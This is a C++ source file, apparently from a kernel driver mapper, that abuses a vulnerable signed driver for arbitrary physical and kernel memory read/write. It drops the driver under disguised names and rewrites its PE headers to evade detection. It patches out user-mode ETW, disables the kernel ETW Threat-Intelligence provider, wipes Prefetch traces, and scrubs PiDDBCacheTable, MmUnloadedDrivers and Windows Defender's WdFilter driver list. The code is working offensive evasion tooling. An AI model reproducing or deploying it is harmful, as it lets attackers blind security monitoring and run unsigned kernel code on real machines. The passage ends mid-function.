#include "intel_driver.hpp"
#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <filesystem>
#include <algorithm>

#include "utils.hpp"
#include "service.hpp"
#include "nt.hpp"

#pragma pack(push, 1)
typedef struct _PHYS_RW_INPUT {
	uint64_t physical_address;
	uint32_t byte_count;
} PHYS_RW_INPUT;
#pragma pack(pop)

HANDLE vdrv::hDevice = 0;
ULONG64 vdrv::ntoskrnlAddr = 0;
ULONG64 vdrv::ntoskrnlPhysBase = 0;
ULONG32 vdrv::ntoskrnlImageSize = 0;
bool vdrv::runtimeReady = false;
ULONG32 vdrv::loadedDriverTimestamp = 0;
std::wstring vdrv::vulnerableDriverPath = L"";
std::wstring vdrv::loadedSymlinkName = L"";
bool vdrv::g_stubPoolReady = false;
std::vector<vdrv::StubEntry> vdrv::g_stubPool;

static uint64_t kernel_MmGetPhysicalAddress = 0;
static std::wstring cachedDriverName = L"";
static std::wstring cachedDriverPath = L"";
static std::wstring cachedDriverDir = L"";

std::wstring vdrv::GetDriverNameW() {
	if (cachedDriverName.empty()) {
		cachedDriverName = kdmUtils::GenerateServiceLikeName();
	}
	return cachedDriverName;
}

std::wstring vdrv::GetDriverPath() {
	if (!cachedDriverPath.empty())
		return cachedDriverPath;

	std::wstring base = kdmUtils::GetSystemDataPath();
	if (base.empty())
		base = kdmUtils::GetFullTempPath();
	if (base.empty())
		return L"";

	std::wstring subdir = base + L"\\" + kdmUtils::GenerateCryptoRandomName(6, 10);
	CreateDirectoryW(subdir.c_str(), NULL);

	static const wchar_t* innocuous_prefixes[] = {
		L"audiosrv", L"netmgr", L"wmicache", L"usbhub", L"dxgi", L"telemetry", L"spoolsvc",
		L"mssrv", L"ntsys", L"wdiag", L"pnpmon", L"evtsys"
	};
	const wchar_t* pfx = innocuous_prefixes[kdmUtils::CryptoRand32() % (sizeof(innocuous_prefixes) / sizeof(innocuous_prefixes[0]))];

	cachedDriverDir = subdir;
	cachedDriverPath = subdir + L"\\" + pfx + GetDriverNameW() + L".sys";
	return cachedDriverPath;
}

std::wstring vdrv::GetSymlinkName() {
	return loadedSymlinkName;
}

HANDLE vdrv::OpenDeviceHandle() {
	std::wstring devPath = L"\\\\.\\" + loadedSymlinkName;
	return CreateFileW(devPath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

void vdrv::CloseDeviceHandle() {
	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
		hDevice = 0;
	}
}

bool vdrv::IsRunning() {
	if (loadedSymlinkName.empty())
		return false;
	std::wstring devPath = L"\\\\.\\" + loadedSymlinkName;
	const HANDLE file_handle = CreateFileW(devPath.c_str(), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

bool vdrv::PopulateStubPool() {
	if (g_stubPoolReady)
		return !g_stubPool.empty();

	std::vector<std::string> candidates = {
		ENC("NtTraceControl"),
		ENC("NtQueryDebugFilterState"),
		ENC("NtSetDebugFilterState"),
		ENC("NtFlushBuffersFileEx"),
		ENC("NtAccessCheckByTypeAndAuditAlarm"),
		ENC("NtAddAtom"),
		ENC("NtGetCurrentProcessorNumber"),
		ENC("NtQueryEvent"),
		ENC("NtFlushVirtualMemory"),
		ENC("NtEnumerateKey"),
		ENC("NtQueryDirectoryObject"),
		ENC("NtPrivilegeCheck"),
		ENC("NtEnumerateValueKey"),
		ENC("NtQueryQuotaInformationFile"),
		ENC("NtFlushKey"),
		ENC("NtQueryFullAttributesFile"),
		ENC("NtOpenKeyEx"),
		ENC("NtQueryVolumeInformationFile"),
		ENC("NtNotifyChangeKey"),
		ENC("NtFlushInstructionCache"),
		ENC("NtGetTickCount"),
		ENC("NtQueryTimerResolution"),
		ENC("NtDeleteValueKey"),
		ENC("NtLockFile"),
	};

	for (size_t i = candidates.size() - 1; i > 0; i--) {
		size_t j = kdmUtils::CryptoRand32() % (i + 1);
		std::swap(candidates[i], candidates[j]);
	}

	size_t target_count = 4 + (kdmUtils::CryptoRand32() % 4);
	for (size_t i = 0; i < candidates.size() && g_stubPool.size() < target_count; i++) {
		uint64_t addr = GetKernelModuleExport(ntoskrnlAddr, candidates[i]);
		if (!addr)
			continue;
		uint8_t probe[16] = { 0 };
		if (!ReadMemory(addr, probe, sizeof(probe)))
			continue;
		if (probe[0] == 0x48 && probe[1] == 0xb8 && probe[10] == 0xff && probe[11] == 0xe0)
			continue;
		if (probe[0] == 0xe9 || probe[0] == 0xeb)
			continue;
		g_stubPool.push_back({ addr, candidates[i] });
	}

	g_stubPoolReady = true;
	return !g_stubPool.empty();
}

bool vdrv::PickStub(uint64_t& out_kaddr, std::string& out_name) {
	if (g_stubPool.empty())
		return false;
	size_t idx = kdmUtils::CryptoRand32() % g_stubPool.size();
	out_kaddr = g_stubPool[idx].kaddr;
	out_name = g_stubPool[idx].name;
	return true;
}

NTSTATUS vdrv::AcquireDebugPrivilege() {
	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
	if (ntdll == NULL)
		return STATUS_UNSUCCESSFUL;

	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled;
	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
	return Status;
}

static uint8_t g_EtwOriginalBytes[8] = { 0 };
static void* g_EtwPatchAddr = nullptr;
static bool g_EtwPatched = false;

static bool PatchUsermodeEtw() {
	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
	if (!ntdll)
		return false;

	auto etwName = ENC("EtwEventWrite");
	g_EtwPatchAddr = reinterpret_cast<void*>(GetProcAddress(ntdll, etwName.c_str()));
	if (!g_EtwPatchAddr)
		return false;

	memcpy(g_EtwOriginalBytes, g_EtwPatchAddr, sizeof(g_EtwOriginalBytes));

	DWORD oldProt = 0;
	if (!VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), PAGE_EXECUTE_READWRITE, &oldProt))
		return false;

	uint8_t patch[] = { 0x33, 0xC0, 0xC3 };
	memcpy(g_EtwPatchAddr, patch, sizeof(patch));

	VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), oldProt, &oldProt);
	g_EtwPatched = true;
	return true;
}

static void RestoreUsermodeEtw() {
	if (!g_EtwPatched || !g_EtwPatchAddr)
		return;

	DWORD oldProt = 0;
	if (VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), PAGE_EXECUTE_READWRITE, &oldProt)) {
		memcpy(g_EtwPatchAddr, g_EtwOriginalBytes, sizeof(g_EtwOriginalBytes));
		VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), oldProt, &oldProt);
	}

	g_EtwPatched = false;
}

static bool DisableKernelEtwTi() {
	if (!vdrv::runtimeReady)
		return false;

	static const uint8_t etwTiGuid[] = {
		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
		0x84, 0x1D, 0xD2, 0x3E, 0xBC, 0x3B, 0x83, 0xAF
	};

	BYTE guidSig[] = {
		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
		0x84, 0x1D, 0xD2, 0x3E, 0xBC, 0x3B, 0x83, 0xAF
	};
	char guidMask[] = "xxxxxxxxxxxxxxxx";

	uintptr_t guidAddr = vdrv::FindPatternInSectionAtKernel(
		".data", vdrv::ntoskrnlAddr, guidSig, guidMask);

	if (!guidAddr) {
		guidAddr = vdrv::FindPatternInSectionAtKernel(
			".rdata", vdrv::ntoskrnlAddr, guidSig, guidMask);
	}

	if (!guidAddr)
		return false;

	uint64_t provRegHandle = guidAddr - 0x20;

	uint64_t enableOffset = provRegHandle + 0x30;

	uint32_t enableInfo = 0;
	if (!vdrv::ReadMemory(enableOffset, &enableInfo, sizeof(enableInfo)))
		return false;

	if (enableInfo == 0)
		return true;

	uint32_t zero = 0;
	if (!vdrv::WriteMemory(enableOffset, &zero, sizeof(zero)))
		return false;

	return true;
}

static size_t PatchSymlinkInBuffer(BYTE* buf, size_t size, const std::wstring& newName) {
	static const wchar_t needleW[] = L"__WDT__";
	const size_t needleBytes = (sizeof(needleW) - sizeof(wchar_t));
	const BYTE* needle = reinterpret_cast<const BYTE*>(needleW);

	size_t newNameWChars = newName.size();
	if (newNameWChars * sizeof(wchar_t) != needleBytes)
		return 0;

	size_t hits = 0;
	for (size_t i = 0; i + needleBytes <= size; i++) {
		if (memcmp(buf + i, needle, needleBytes) == 0) {
			memcpy(buf + i, newName.data(), needleBytes);
			hits++;
		}
	}
	return hits;
}

static bool PatchDriverFile(const std::wstring& driver_path, ULONG32* out_timestamp, std::wstring* out_symlink) {
	HANDLE hFile = CreateFileW(driver_path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	DWORD fileSize = GetFileSize(hFile, nullptr);
	if (!fileSize || fileSize > 32 * 1024 * 1024) {
		CloseHandle(hFile);
		return false;
	}

	auto buffer = std::make_unique<BYTE[]>(fileSize);
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, buffer.get(), fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
		CloseHandle(hFile);
		return false;
	}

	auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.get());
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		CloseHandle(hFile);
		return false;
	}

	auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(buffer.get() + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		CloseHandle(hFile);
		return false;
	}

	ULONG32 realisticLow  = 0x55000000u;
	ULONG32 realisticHigh = 0x68c00000u;
	ULONG32 range = realisticHigh - realisticLow;
	ULONG32 newTimestamp = realisticLow + (kdmUtils::CryptoRand32() % range);
	ntHeaders->FileHeader.TimeDateStamp = newTimestamp;

	ntHeaders->OptionalHeader.CheckSum = 0;

	std::wstring newSymlink = kdmUtils::GenerateCryptoRandomName(7, 7);
	size_t hits = PatchSymlinkInBuffer(buffer.get(), fileSize, newSymlink);

	auto hiddenSection = [&](const char* name) -> PIMAGE_SECTION_HEADER {
		PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
		for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
			if (memcmp(sections[i].Name, name, strlen(name)) == 0)
				return &sections[i];
		}
		return nullptr;
	};

	auto patchTailPaddingIfZero = [&](PIMAGE_SECTION_HEADER sec, DWORD max_bytes) {
		if (!sec)
			return;
		if (sec->SizeOfRawData <= sec->Misc.VirtualSize)
			return;
		DWORD padding_start = sec->PointerToRawData + sec->Misc.VirtualSize;
		DWORD padding_bytes = sec->SizeOfRawData - sec->Misc.VirtualSize;
		DWORD patch_bytes = padding_bytes < max_bytes ? padding_bytes : max_bytes;
		if (patch_bytes < 8)
			return;
		if (padding_start + patch_bytes > fileSize)
			return;
		for (DWORD k = 0; k < patch_bytes; k++) {
			if (buffer[padding_start + k] != 0)
				return;
		}
		kdmUtils::CryptoFill(buffer.get() + padding_start, patch_bytes);
	};

	patchTailPaddingIfZero(hiddenSection(".reloc"), 16);

	PIMAGE_SECTION_HEADER rsrc_sec = hiddenSection(".rsrc");
	if (rsrc_sec) {
		bool has_version = false;
		if (rsrc_sec->PointerToRawData && rsrc_sec->SizeOfRawData >= 32 &&
			rsrc_sec->PointerToRawData + rsrc_sec->SizeOfRawData <= fileSize) {
			static const uint8_t vs_marker[] = { 'V', 0, 'S', 0, '_', 0, 'V', 0, 'E', 0, 'R', 0, 'S', 0, 'I', 0, 'O', 0, 'N', 0 };
			BYTE* rsrc_data = buffer.get() + rsrc_sec->PointerToRawData;
			DWORD rsrc_sz = rsrc_sec->SizeOfRawData;
			for (DWORD k = 0; k + sizeof(vs_marker) <= rsrc_sz; k++) {
				if (memcmp(rsrc_data + k, vs_marker, sizeof(vs_marker)) == 0) {
					has_version = true;
					break;
				}
			}
		}
		if (!has_version)
			patchTailPaddingIfZero(rsrc_sec, 32);
	}

	auto& debugDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
	if (debugDir.VirtualAddress && debugDir.Size) {
		DWORD dbg_off = 0;
		PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
		for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
			if (debugDir.VirtualAddress >= sections[i].VirtualAddress &&
				debugDir.VirtualAddress < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
				dbg_off = sections[i].PointerToRawData + (debugDir.VirtualAddress - sections[i].VirtualAddress);
				break;
			}
		}
		if (dbg_off && dbg_off + debugDir.Size <= fileSize) {
			kdmUtils::CryptoFill(buffer.get() + dbg_off, debugDir.Size);
		}
	}

	SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
	DWORD bytesWritten = 0;
	WriteFile(hFile, buffer.get(), fileSize, &bytesWritten, nullptr);
	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	if (out_timestamp)
		*out_timestamp = newTimestamp;
	if (out_symlink && hits > 0)
		*out_symlink = newSymlink;
	else if (out_symlink)
		*out_symlink = L"";

	return true;
}

static void CleanupPrefetch(const std::wstring& driver_path) {
	wchar_t winDir[MAX_PATH + 1] = { 0 };
	if (!GetWindowsDirectoryW(winDir, MAX_PATH))
		return;

	std::wstring prefetchDir = std::wstring(winDir) + L"\\Prefetch";

	std::error_code ec;
	if (!std::filesystem::exists(prefetchDir, ec))
		return;

	std::wstring filename;
	try {
		filename = std::filesystem::path(driver_path).filename().wstring();
	}
	catch (...) {
		return;
	}
	if (filename.empty())
		return;

	for (auto& ch : filename)
		ch = (wchar_t)towupper(ch);

	std::wstring pattern = prefetchDir + L"\\" + filename + L"-*.pf";

	WIN32_FIND_DATAW findData = { 0 };
	HANDLE hFind = FindFirstFileW(pattern.c_str(), &findData);
	if (hFind == INVALID_HANDLE_VALUE)
		return;

	do {
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;
		std::wstring fullPath = prefetchDir + L"\\" + findData.cFileName;
		SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
		DeleteFileW(fullPath.c_str());
	} while (FindNextFileW(hFind, &findData));

	FindClose(hFind);
}

static void SecureDeleteFile(const std::wstring& path) {
	HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile != INVALID_HANDLE_VALUE) {
		LARGE_INTEGER fileSize;
		GetFileSizeEx(hFile, &fileSize);

		auto junkSize = static_cast<DWORD>(fileSize.QuadPart + (kdmUtils::CryptoRand32() % 4096));
		auto junk = std::make_unique<BYTE[]>(junkSize);

		HCRYPTPROV hProv = 0;
		CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
		CryptGenRandom(hProv, junkSize, junk.get());
		CryptReleaseContext(hProv, 0);

		SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
		DWORD written = 0;
		WriteFile(hFile, junk.get(), junkSize, &written, nullptr);
		FlushFileBuffers(hFile);
		CloseHandle(hFile);
	}

	for (int pass = 0; pass < 3; pass++) {
		if (_wremove(path.c_str()) == 0)
			break;
		Sleep(50);
	}

	std::wstring dir = path.substr(0, path.find_last_of(L'\\'));
	RemoveDirectoryW(dir.c_str());
}

bool vdrv::PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size) {
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint32_t chunk = (uint32_t)((size - offset) < 0x1000 ? (size - offset) : 0x1000);

		PHYS_RW_INPUT input = {};
		input.physical_address = physical_address + offset;
		input.byte_count = chunk;

		DWORD bytes_returned = 0;
		if (!DeviceIoControl(hDevice, IOCTL_PHYS_READ_BYTE_BULK,
			&input, sizeof(input),
			(uint8_t*)buffer + offset, chunk,
			&bytes_returned, nullptr))
			return false;

		offset += chunk;
	}
	return true;
}

bool vdrv::PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size) {
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint32_t chunk = (uint32_t)((size - offset) < 0x1000 ? (size - offset) : 0x1000);
		uint32_t input_size = sizeof(PHYS_RW_INPUT) + chunk;
		auto input_buf = std::make_unique<uint8_t[]>(input_size);

		auto* header = reinterpret_cast<PHYS_RW_INPUT*>(input_buf.get());
		header->physical_address = physical_address + offset;
		header->byte_count = chunk;
		memcpy(input_buf.get() + sizeof(PHYS_RW_INPUT), (const uint8_t*)buffer + offset, chunk);

		DWORD bytes_returned = 0;
		if (!DeviceIoControl(hDevice, IOCTL_PHYS_WRITE_BYTE_BULK,
			input_buf.get(), input_size,
			nullptr, 0,
			&bytes_returned, nullptr))
			return false;

		offset += chunk;
	}
	return true;
}

bool vdrv::ScanForNtoskrnlPhysBase() {
	if (!ntoskrnlAddr)
		return false;

	ULONG bufferSize = 0;
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, nullptr, 0, &bufferSize);
	if (!bufferSize)
		return false;

	auto modInfo = std::make_unique<uint8_t[]>(bufferSize);
	if (!NT_SUCCESS(NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, modInfo.get(), bufferSize, &bufferSize)))
		return false;

	auto modules = reinterpret_cast<nt::PRTL_PROCESS_MODULES>(modInfo.get());
	for (ULONG i = 0; i < modules->NumberOfModules; i++) {
		if ((uint64_t)modules->Modules[i].ImageBase == ntoskrnlAddr) {
			ntoskrnlImageSize = modules->Modules[i].ImageSize;
			break;
		}
	}

	if (!ntoskrnlImageSize)
		return false;

	const uint64_t LARGE_PAGE = 0x200000;
	const uint64_t MAX_SCAN = 0x80000000ULL;

	uint8_t header_buf[0x1000];

	for (uint64_t pa = 0; pa < MAX_SCAN; pa += LARGE_PAGE) {
		if (!PhysicalRead(pa, header_buf, sizeof(header_buf)))
			continue;

		auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(header_buf);
		if (dos->e_magic != IMAGE_DOS_SIGNATURE)
			continue;

		if (dos->e_lfanew <= 0 || (ULONG)dos->e_lfanew >= 0x800)
			continue;

		auto nt_hdr = reinterpret_cast<PIMAGE_NT_HEADERS64>(header_buf + dos->e_lfanew);
		if (nt_hdr->Signature != IMAGE_NT_SIGNATURE)
			continue;

		if (nt_hdr->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
			continue;

		if (nt_hdr->OptionalHeader.SizeOfImage != ntoskrnlImageSize)
			continue;

		auto exportDir = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
		if (!exportDir.VirtualAddress || !exportDir.Size)
			continue;

		ntoskrnlPhysBase = pa;
		return true;
	}

	return false;
}

bool vdrv::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address + size <= ntoskrnlAddr + ntoskrnlImageSize) {
		uint64_t pa = ntoskrnlPhysBase + (address - ntoskrnlAddr);
		return PhysicalRead(pa, buffer, size);
	}

	if (!runtimeReady || !kernel_MmGetPhysicalAddress)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint64_t current_va = address + offset;
		uint64_t page_offset = current_va & 0xFFF;
		uint64_t chunk = size - offset;
		if (chunk > 0x1000 - page_offset)
			chunk = 0x1000 - page_offset;

		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, current_va))
			return false;

		if (!pa_result.QuadPart)
			return false;

		if (!PhysicalRead(pa_result.QuadPart, (uint8_t*)buffer + offset, chunk))
			return false;

		offset += chunk;
	}
	return true;
}

bool vdrv::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address + size <= ntoskrnlAddr + ntoskrnlImageSize) {
		uint64_t pa = ntoskrnlPhysBase + (address - ntoskrnlAddr);
		return PhysicalWrite(pa, buffer, size);
	}

	if (!runtimeReady || !kernel_MmGetPhysicalAddress)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint64_t current_va = address + offset;
		uint64_t page_offset = current_va & 0xFFF;
		uint64_t chunk = size - offset;
		if (chunk > 0x1000 - page_offset)
			chunk = 0x1000 - page_offset;

		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, current_va))
			return false;

		if (!pa_result.QuadPart)
			return false;

		if (!PhysicalWrite(pa_result.QuadPart, (uint8_t*)buffer + offset, chunk))
			return false;

		offset += chunk;
	}
	return true;
}

bool vdrv::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address < ntoskrnlAddr + ntoskrnlImageSize) {
		physical_address = ntoskrnlPhysBase + (address - ntoskrnlAddr);
	}
	else if (runtimeReady && kernel_MmGetPhysicalAddress) {
		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, address))
			return false;
		physical_address = pa_result.QuadPart;
	}
	else {
		return false;
	}

	if (!physical_address)
		return false;

	return PhysicalWrite(physical_address, buffer, size);
}

NTSTATUS vdrv::Load() {
	if (kdmUtils::IsHvciWithBlocklistActive())
		return STATUS_ACCESS_DENIED;

	if (vdrv::IsRunning())
		return STATUS_ALREADY_REGISTERED;

	if (vulnerableDriverPath.empty() || !std::filesystem::exists(vulnerableDriverPath))
		return STATUS_NOT_FOUND;

	std::vector<BYTE> driverData;
	if (!kdmUtils::ReadFileToMemory(vulnerableDriverPath, &driverData))
		return STATUS_DISK_OPERATION_FAILED;

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty())
		return STATUS_UNSUCCESSFUL;

	_wremove(driver_path.c_str());

	PatchUsermodeEtw();

	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(driverData.data()), driverData.size())) {
		RestoreUsermodeEtw();
		return STATUS_DISK_OPERATION_FAILED;
	}

	ULONG32 ts = 0;
	std::wstring newSymlink;
	if (!PatchDriverFile(driver_path, &ts, &newSymlink) || !ts) {
		RestoreUsermodeEtw();
		SecureDeleteFile(driver_path);
		return STATUS_UNSUCCESSFUL;
	}
	loadedDriverTimestamp = ts;
	loadedSymlinkName = newSymlink.empty() ? std::wstring(L"__WDT__") : newSymlink;

	auto status = AcquireDebugPrivilege();
	if (!NT_SUCCESS(status)) {
		RestoreUsermodeEtw();
		SecureDeleteFile(driver_path);
		return status;
	}

	status = service::RegisterAndStart(driver_path, GetDriverNameW());
	if (!NT_SUCCESS(status)) {
		RestoreUsermodeEtw();
		SecureDeleteFile(driver_path);
		return status;
	}

	hDevice = OpenDeviceHandle();

	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_NOT_FOUND;
	}

	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
	if (ntoskrnlAddr == 0) {
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_BAD_DLL_ENTRYPOINT;
	}

	if (!ScanForNtoskrnlPhysBase()) {
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_NOT_FOUND;
	}

	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, ENC("MmGetPhysicalAddress"));
	if (!kernel_MmGetPhysicalAddress) {
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	runtimeReady = true;

	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!vdrv::ReadMemory(vdrv::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_INVALID_IMAGE_FORMAT;
	}

	PopulateStubPool();

	vdrv::ScopedPriorityBoost _boost;

	DisableKernelEtwTi();

	RestoreUsermodeEtw();

	if (!vdrv::ClearPiDDBCacheTable()) {
		vdrv::Unload();
		return STATUS_DELETE_PENDING | 0x1000;
	}

	if (!vdrv::ClearKernelHashBucketList()) {
		vdrv::Unload();
		return STATUS_DELETE_PENDING | 0x2000;
	}

	if (!vdrv::ClearMmUnloadedDrivers()) {
		vdrv::Unload();
		return STATUS_DELETE_PENDING | 0x3000;
	}

	vdrv::ClearWdFilterDriverList();

	return STATUS_SUCCESS;
}

bool vdrv::ClearWdFilterDriverList() {
	auto WdFilter = kdmUtils::GetKernelModuleAddress(ENC("WdFilter.sys"));
	if (!WdFilter)
		return true;

	auto RuntimeDriversList = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (!RuntimeDriversList)
		return false;

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (!RuntimeDriversCountRef)
		return false;

	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?x???x???????????x");
		if (!MpFreeDriverInfoExRef)
			return false;
		MpFreeDriverInfoExRef += 0x3;
	}

	MpFreeDriverInfoExRef += 0x3;

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress((PVOID)MpFreeDriverInfoExRef, 1, 5);

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* {
		LIST_ENTRY* Entry;
		if (!ReadMemory(Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), vdrv::GetDriverNameW().c_str())) {
					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) {
						PVOID value = 0;
						ReadMemory(RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1);
							WriteMemory(RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if (!removedRuntimeDriversArray)
						return false;

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));

					ULONG current = 0;
					ReadMemory(RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(RuntimeDriversCount, &current, sizeof(ULONG));

					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;
					USHORT Magic = 0;
					ReadMemory(DriverInfo, &Magic, sizeof(USHORT));
					if (Magic == 0xDA18) {
						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					return true;
				}
			}
		}
	}
	return false;
}

NTSTATUS vdrv::Unload() {
	runtimeReady = false;
